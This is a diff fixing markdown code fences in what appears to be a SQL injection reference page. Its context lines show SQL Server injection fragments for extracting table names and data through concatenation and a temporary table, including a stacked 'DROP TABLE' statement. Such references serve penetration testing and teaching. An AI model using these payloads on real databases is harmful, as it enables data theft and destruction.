@@ -138,7 +138,7 @@ WHERE o.name = 'users'
 
 When you can only return a single value, use concatenation:
 
-````sql
+```sql
 -- Concatenate table names (SQL Server 2017+)
 SELECT STRING_AGG(name, ',') FROM sys.tables
 
@@ -147,6 +147,7 @@ SELECT STUFF((
     FROM sys.tables
     FOR XML PATH('')
 ), 1, 1, '')
+```
 
 ### Legacy Bulk Extraction (Temporary Tables)
 
@@ -161,7 +162,7 @@ AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
 
 -- 3. Cleanup
 AND 1=0; DROP TABLE TMP_DB;
-````
+```
 
 ### Practical Injection Examples
 
